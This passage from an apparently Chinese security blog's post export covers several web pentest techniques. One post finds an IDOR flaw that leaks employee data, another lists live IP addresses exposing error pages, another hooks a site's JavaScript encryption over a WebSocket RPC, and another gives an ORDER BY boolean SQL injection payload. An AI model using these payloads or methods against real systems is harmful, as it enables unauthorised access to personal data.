<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195933-46fcc57a-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195933-46fcc57a-794b-1.png" alt="img"></a></p>
<p>之后变换成get请求，发现某些接口直接就返回了大量的数据，如下两个接口，其中一个接口直接返回了当前我自己的信息，而且信息非常的多。根据个人经验，这种返回persion信息的地方常常都有参数可遍历，而默认情况就是返回自身数据。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195942-4c2affee-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195942-4c2affee-794b-1.png" alt="img"></a></p>
<p>使用技巧，返回包转请求包</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195949-5079c3b4-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195949-5079c3b4-794b-1.png" alt="img"></a></p>
<p>最终定位到了persionId参数为影响数据的参数，可以看到我personID&#x3D;1 就返回异常，而输入我自己的正确的personID就返回正常。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200003-58db2a52-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200003-58db2a52-794b-1.png" alt="img"></a></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200015-5ff72534-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200015-5ff72534-794b-1.png" alt="img"></a></p>
<p>那么接下来的思路就是寻找这个personId，通过get请求发现某些接口返回的数据和这个personId很像，比如下面的&#x2F;tree&#x2F;list 接口里的manager，都是xxx-xxx-xxx格式的，有没有可能这就是同一个数据的不同命名。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200028-677a849a-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200028-677a849a-794b-1.png" alt="img"></a></p>
<p>带上manager的值去访问，一个严重的越权访问就此得到</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200043-7051dece-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200043-7051dece-794b-1.png" alt="img"></a></p>
<h2 id="4、构造接口"><a href="#4、构造接口" class="headerlink" title="4、构造接口"></a>4、构造接口</h2><p>发现了一些GET&#x2F;POST能够直接返回数据的接口，但是其实绝大部分的接口其实还是返回的服务异常，如果直接忽视掉这些肯定会错过很多漏洞。<br> 比如onBoardTab接口，get、post都是返回服务异常。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200052-75ec3e56-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200052-75ec3e56-794b-1.png" alt="img"></a></p>
<p>肯定是缺少了某些参数导致，盲目猜参数是最无效的方法，返回包是json格式，有没有可能我们转为x-www-form-urlencoded解析是存在问题，但是转为json格式就能成功呢？尝试一下</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200100-7abb2802-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200100-7abb2802-794b-1.png" alt="img"></a></p>
<p>直接提示参数了，这就解决了，发现该接口的返回不一般，直接返回了员工的大量个人信息。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200106-7df5d8be-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200106-7df5d8be-794b-1.png" alt="img"></a></p>
<h2 id="5、运气构造接口"><a href="#5、运气构造接口" class="headerlink" title="5、运气构造接口"></a>5、运气构造接口</h2><p>之后通过json格式的数据包又批量跑了一下，发现还是有一部分的接口还是存在问题的，没有返回500，而是返回200空数据，那么有可能这些接口可能还是缺少了参数，但是应该不是同一个人写的代码，这一块有可能是@RequestMapping注解不同所导致的问题。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200119-86214fd2-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200119-86214fd2-794b-1.png" alt="img"></a></p>
<p>但是我又不想爆破，爆破是最后没办法的办法<br> 于是找了之前的JS想看看是不是JS中有提供一些信息（有时候JS会直接提供参数），可以看到有13个JS文件，一个一个看吧，发现每个JS文件的内容都是不一样的</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200126-8a2dde6a-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200126-8a2dde6a-794b-1.png" alt="img"></a></p>
<p>发现大部分的JS都是没有什么提示的</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200145-95b3038c-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200145-95b3038c-794b-1.png" alt="img"></a></p>
<p>但是在一些JS里找到了searchParams字符串，这个字符串非常的可疑，很多JS文件里都有这个字符串，那么我们是不是可以批量提取一下这个字符串，然后将其变成参数呢？</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200154-9af2668a-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200154-9af2668a-794b-1.png" alt="img"></a></p>
<p>匹配的规则就是e.searchParams,”[a-zA-Z_]+”，效果如下</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200205-a1754518-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200205-a1754518-794b-1.png" alt="img"></a></p>
<p>简单处理下</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200228-aefdccaa-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200228-aefdccaa-794b-1.png" alt="img"></a></p>
<p>然后再转为json格式，直接返回了数据！！！</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200233-b21eaed6-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200233-b21eaed6-794b-1.png" alt="img"></a></p>
<p>之后逐个删除，发现决定该接口的是orgId这个参数。</p>
<p>同样的，我们也可以关注”$route.query.xxxxx”这样的字符串，例如下面两图所示，可能是会是获取参数的有效方式之一。<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200253-be0f89c2-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200253-be0f89c2-794b-1.png" alt="img"></a></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211200257-c044bee2-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211200257-c044bee2-794b-1.png" alt="img"></a></p>
<p>​                </p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/posts/0.html</url>
    <content><![CDATA[<hr>
<hr>
<p>1、tomcat报错页面</p>
<p><a href="http://121.33.234.188:8888/1111111">http://121.33.234.188:8888/1111111</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%8A%A5%E9%94%99%E9%A1%B5%E9%9D%A2%E7%89%88%E6%9C%AC%E5%8F%B7%E6%8F%90%E5%8F%96/image-20230111104451791.png" alt="image-20230111104451791"></p>
<p>2、nginx报错页面</p>
<p><a href="http://47.110.224.48/fffffffff">http://47.110.224.48/fffffffff</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%8A%A5%E9%94%99%E9%A1%B5%E9%9D%A2%E7%89%88%E6%9C%AC%E5%8F%B7%E6%8F%90%E5%8F%96/image-20230111104552062.png" alt="image-20230111104552062"></p>
<p>3、ThinkPHP 报错页面</p>
<p><a href="https://112.74.162.243/ddddddddddddd">https://112.74.162.243/ddddddddddddd</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%8A%A5%E9%94%99%E9%A1%B5%E9%9D%A2%E7%89%88%E6%9C%AC%E5%8F%B7%E6%8F%90%E5%8F%96/image-20230111110026441.png" alt="image-20230111110026441"></p>
<p>4、django debug模式</p>
<p>You’re seeing this error because you have DEBUG &#x3D; True</p>
]]></content>
  </entry>
  <entry>
    <title>filter琐碎，bypass负能量，restart热爱</title>
    <url>/posts/dc27d811.html</url>
    <content><![CDATA[<h2 id="琐碎和负能量"><a href="#琐碎和负能量" class="headerlink" title="琐碎和负能量"></a>琐碎和负能量</h2><p>实习了六个月，从满怀激情到逐渐平淡，其中最难的是时间应该是初入社会的独居生活，不过所幸的是一直被工作推着走，和一个一直陪着我的人，没有太多时间去思考孤独等人生问题。</p>
<p>不过现在进入了工作的平淡期和感情挫折的双重打击，有了些迷茫，不知道工作的意义和提升技术的意义了，下班后回到小房间，漫无意义充满了我，对生活少了期待。</p>
<h2 id="改变"><a href="#改变" class="headerlink" title="改变"></a>改变</h2><p>每次遇到低谷期，我总是依靠从说唱音乐中汲取力量来度过这段时光，这一次也不例外。</p>
<p>我听了幼稚园杀手的《生命如潮》，让我很感动，让我感受最深的一句歌词是“只有痛苦让我清醒”，一遍又一遍的循环，唯有戴着我的绿联T3耳机去听才最有感觉。</p>
<p>我想做出一些积极的改变，我开始去做一些有意义的事情。</p>
<p>去做一些锻炼，练到疲惫，在每晚入睡之前耗尽多巴胺，来让自己没有精力去想太多。</p>
<p>保留痛苦，时刻让自己清醒。</p>
<p>去广州最繁华的地方，看众生百态。</p>
<p>听朋友讲他的pc故事，一笑而过。</p>
<p>看梅西任意球绝杀比赛，为他而高兴。</p>
<p>日常看拷打阿伟罗的视频。</p>
<p>和年轻的灵魂交流，保持心灵的年轻。</p>
<p>在地铁上看技术文章，学习getshell新姿势。</p>
<p>不断探索奇妙而新奇的事。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>重新唤起自己对网络安全的热爱，所幸的是我还在努力，写了一些虽然技术含量不高的工具，但总归还是在前进，没有停下。</p>
<p>生命如潮，潮起潮落，未来的路还很长，一起加油，共勉，永远爱你</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E9%87%8D%E6%96%B0%E5%87%BA%E5%8F%91/18.jpg" alt="18"></p>
]]></content>
      <categories>
        <category>实习系列</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>js逆向之远程调用(rpc)免去抠代码补环境</title>
    <url>/posts/c5347700.html</url>
    <content><![CDATA[<h2 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h2><p>在调用加密函数前面插入以下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hlclient.prototype.connect = function () &#123;</span><br><span class="line">                    console.log(&#x27;begin of connect to wsURL: &#x27; + this.wsURL);</span><br><span class="line">                    var _this = this;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        this.socket[&quot;ySocket&quot;] = new WebSocket(this.wsURL);</span><br><span class="line">                        this.socket[&quot;ySocket&quot;].onmessage = function (e) &#123;</span><br><span class="line">                            try&#123;</span><br><span class="line">                                let blob=e.data</span><br><span class="line">                                blob.text().then(data =&gt;&#123;</span><br><span class="line">                                    _this.handlerRequest(data);</span><br><span class="line">                                &#125;)</span><br><span class="line">                            &#125;catch&#123;</span><br><span class="line">                                console.log(&quot;not blob&quot;)</span><br><span class="line">                                _this.handlerRequest(blob)</span><br><span class="line">                            &#125;</span><br><span class="line">                </span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; catch (e) &#123;</span><br><span class="line">                        console.log(&quot;connection failed,reconnect after 10s&quot;);</span><br><span class="line">                        setTimeout(function () &#123;</span><br><span class="line">                            _this.connect()</span><br><span class="line">                        &#125;, 10000)</span><br><span class="line">                    &#125;</span><br><span class="line">                    this.socket[&quot;ySocket&quot;].onclose = function () &#123;</span><br><span class="line">                        console.log(&quot;connection failed,reconnect after 10s&quot;);</span><br><span class="line">                        setTimeout(function () &#123;</span><br><span class="line">                            _this.connect()</span><br><span class="line">                        &#125;, 10000)</span><br><span class="line">                    &#125;</span><br><span class="line">                </span><br><span class="line">                &#125;;</span><br><span class="line">                Hlclient.prototype.send = function (msg) &#123;</span><br><span class="line">                    this.socket[&quot;ySocket&quot;].send(msg)</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                Hlclient.prototype.regAction = function (func_name, func) &#123;</span><br><span class="line">                    if (typeof func_name !== &#x27;string&#x27;) &#123;</span><br><span class="line">                        throw new Error(&quot;an func_name must be string&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (typeof func !== &#x27;function&#x27;) &#123;</span><br><span class="line">                        throw new Error(&quot;must be function&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    console.log(&quot;register func_name: &quot; + func_name);</span><br><span class="line">                    this.handlers[func_name] = func;</span><br><span class="line">                    return true</span><br><span class="line">                </span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                //收到消息后这里处理，</span><br><span class="line">                Hlclient.prototype.handlerRequest = function (requestJson) &#123;</span><br><span class="line">                    var _this = this;</span><br><span class="line">                    var result=JSON.parse(requestJson);</span><br><span class="line">                    //console.log(result)</span><br><span class="line">                    if (!result[&#x27;action&#x27;]) &#123;</span><br><span class="line">                        this.sendResult(&#x27;&#x27;,&#x27;need request param &#123;action&#125;&#x27;);</span><br><span class="line">                        return</span><br><span class="line">                    &#125;</span><br><span class="line">                    var action=result[&quot;action&quot;]</span><br><span class="line">                    var theHandler = this.handlers[action];</span><br><span class="line">                    if (!theHandler)&#123;</span><br><span class="line">                        this.sendResult(action,&#x27;action not found&#x27;);</span><br><span class="line">                        return</span><br><span class="line">                    &#125;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        if (!result[&quot;param&quot;])&#123;</span><br><span class="line">                            theHandler(function (response) &#123;</span><br><span class="line">                                _this.sendResult(action, response);</span><br><span class="line">                            &#125;)</span><br><span class="line">                        &#125;else&#123;</span><br><span class="line">                            var param=result[&quot;param&quot;]</span><br><span class="line">                            try &#123;</span><br><span class="line">                                param=JSON.parse(param)</span><br><span class="line">                            &#125;catch (e)&#123;</span><br><span class="line">                                console.log(&quot;&quot;)</span><br><span class="line">                            &#125;</span><br><span class="line">                            theHandler(function (response) &#123;</span><br><span class="line">                                _this.sendResult(action, response);</span><br><span class="line">                            &#125;,param)</span><br><span class="line">                        &#125;</span><br><span class="line">                </span><br><span class="line">                    &#125; catch (e) &#123;</span><br><span class="line">                        console.log(&quot;error: &quot; + e);</span><br><span class="line">                        _this.sendResult(action+e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                Hlclient.prototype.sendResult = function (action, e) &#123;</span><br><span class="line">                    this.send(action + atob(&quot;aGxeX14&quot;) + e);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var hlc = new Hlclient(&quot;ws://127.0.0.1:12080/ws?group=zzz&amp;name=hlg&quot;);</span><br><span class="line">                hlc.regAction(&quot;getenc&quot;, function (resolve,param) &#123;</span><br><span class="line">                    var myenc = a.encryptedData(param)</span><br><span class="line">                    resolve(myenc);</span><br><span class="line">                </span><br><span class="line">                &#125;),</span><br></pre></td></tr></table></figure>

<p><code>a.encryptedData</code>是目标js文件里的加密函数</p>
<p>然后输入账号密码登录，js rpc 上线成功。</p>
<p>访问：<a href="http://127.0.0.1:12080/go?group=zzz&amp;name=hlg&amp;action=getenc&amp;param=ffff">http://127.0.0.1:12080/go?group=zzz&amp;name=hlg&amp;action=getenc&amp;param=ffff</a></p>
<p>测试成功，不要关闭刷新网页。</p>
<p>python调用代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests,time</span><br><span class="line">from concurrent.futures.thread import ThreadPoolExecutor</span><br><span class="line">tp = ThreadPoolExecutor(max_workers=50)</span><br><span class="line">def fetch_response(url):</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    return url,response.text</span><br><span class="line"></span><br><span class="line">def callback_successed(f):</span><br><span class="line">    print(f.result())</span><br><span class="line"></span><br><span class="line">start_timestamp = time.time()</span><br><span class="line">for i in range(100):</span><br><span class="line">    tp.submit(fetch_response,&quot;http://localhost:12080/go?group=zzz&amp;name=hlg&amp;action=getenc&amp;param=&#123;&#125;&quot;.format(i)).add_done_callback(callback_successed)</span><br><span class="line">tp.shutdown()</span><br><span class="line">end_timestamp = time.time()</span><br><span class="line"></span><br><span class="line">print(&quot;每个请求时间开销:&#123;&#125;ms&quot;.format(round(end_timestamp-start_timestamp,3) *1000 / 100))</span><br></pre></td></tr></table></figure>

<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://jason-yep.notion.site/JS-fc9829a45c4347d3bc3ab2bac37c85f3#dfc92edcea27497297541c095d1e8421">https://jason-yep.notion.site/JS-fc9829a45c4347d3bc3ab2bac37c85f3#dfc92edcea27497297541c095d1e8421</a></p>
<p><a href="https://github.com/jxhczhl/JsRpc">https://github.com/jxhczhl/JsRpc</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/posts/0.html</url>
    <content><![CDATA[<hr>
<hr>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>VMOS PRO</p>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform DER -in cacert.der -out PortSwiggerCA.pem</span><br></pre></td></tr></table></figure>

<p>会输出一个hash串，然后用hash重命名证书。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform PEM -subject_hash_old -in PortSwiggerCA.pem|head -1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv PortSwiggerCA.pem 9a5ba575.0</span><br></pre></td></tr></table></figure>

<p>移动证书到系统证书9a5ba575.0 到目录 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts 下</p>
]]></content>
  </entry>
  <entry>
    <title>ios 客户端测试</title>
    <url>/posts/a5c20025.html</url>
    <content><![CDATA[<p>参考链接</p>
<h4 id="IOS苹果手机越狱-安装绕过签名插件-脱壳插件"><a href="#IOS苹果手机越狱-安装绕过签名插件-脱壳插件" class="headerlink" title="IOS苹果手机越狱+安装绕过签名插件+脱壳插件"></a>IOS苹果手机越狱+安装绕过签名插件+脱壳插件</h4><p><a href="https://cn-sec.com/archives/1372576.html">https://cn-sec.com/archives/1372576.html</a></p>
<h4 id="iOS逆向之必要软件安装"><a href="#iOS逆向之必要软件安装" class="headerlink" title="iOS逆向之必要软件安装"></a>iOS逆向之必要软件安装</h4><p><a href="https://cloud.tencent.com/developer/article/1699832">https://cloud.tencent.com/developer/article/1699832</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class-dump-z -H AppName/Payload/AppName.app/AppName -o storeheaders</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>移动安全</tag>
      </tags>
  </entry>
  <entry>
    <title>记录sql注入的发现技巧</title>
    <url>/posts/8ba4b8c2.html</url>
    <content><![CDATA[<blockquote>
<p>  文章地址：<a href="https://www.freebuf.com/articles/web/338744.html">https://www.freebuf.com/articles/web/338744.html</a></p>
</blockquote>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>把 order_by&#x3D;undefined 的参数值改为 order_by&#x3D;asc 或者 order_by&#x3D;desc，再在其他参数处注入。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(substr(database (),1,1)=&#x27;i&#x27;,1,(select+1+union+select+2))</span><br><span class="line"></span><br><span class="line">因为此处是order by注入，这句payload翻译过来就是：如果数据库名字的第一个字母是i，就执行1，如果不是i，就执行select 1 union select 2,又因为这个语句返回的是两行数据，在语法规范上是错误的，导致整条语句都不执行，所以报错。这样就可根据返回码来区分，并进行快速爆破来判断出数据库名，类似于布尔盲注。</span><br></pre></td></tr></table></figure>



<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>参数化会将参数值加上引号，但是order by字段不能带引号，所以很多排序功能常存在注入问题，如mybatis中预编译使用 #{} 而order by 字段使用参数化后有问题，所以开发者可能直接就使用 ${ }从而存在注入问题。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Sql</tag>
      </tags>
  </entry>
</search>
